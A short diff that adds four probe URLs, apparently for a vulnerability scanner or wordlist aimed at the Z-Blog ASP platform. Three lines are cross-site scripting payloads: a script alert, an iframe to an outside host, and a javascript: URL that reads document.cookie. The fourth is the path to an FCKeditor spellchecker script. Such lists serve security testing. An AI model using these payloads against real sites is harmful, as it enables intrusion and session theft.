@@ -1,0 +1,4 @@
+/catalog.asp?tags=Z-Blog"></title><script>alert('sebug')</script>
+/cmd.asp?act=gettburl&id=10"><iframe%20src=http://www.mramydnei.com%20></iframe>
+/admin/FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
+/function/c_error.asp?errorid=7&number=0&description=&source=&sourceurl=javascript:alert(document.cookie
